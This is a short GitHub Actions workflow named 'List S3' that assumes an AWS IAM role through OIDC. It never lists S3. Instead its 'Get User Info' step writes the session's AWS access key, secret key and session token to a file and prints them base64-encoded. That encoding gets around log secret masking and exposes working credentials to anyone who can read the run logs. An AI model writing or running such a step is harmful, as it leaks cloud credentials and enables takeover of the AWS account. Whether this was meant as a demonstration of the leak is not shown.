name: List S3

on:
  push:
    branches: [ "main" ]
permissions:
  id-token: write # Necessário para solicitar o token OIDC
  contents: read

jobs:
  read:
    name: "LS aws s3"
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS credentials from Test account
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::604218333462:role/S4US-oidc
          aws-region: us-east-1
      
      - name: Get User Info
        run: |
          aws sts get-caller-identity
          echo "AWS_DEFAULT_REGION=$AWS_DEFAULT_REGION" > /tmp/data
          echo "AWS_REGION=$AWS_REGION" >> /tmp/data
          echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID" >> /tmp/data
          echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" >> /tmp/data
          echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN" >> /tmp/data
          cat /tmp/data | base64
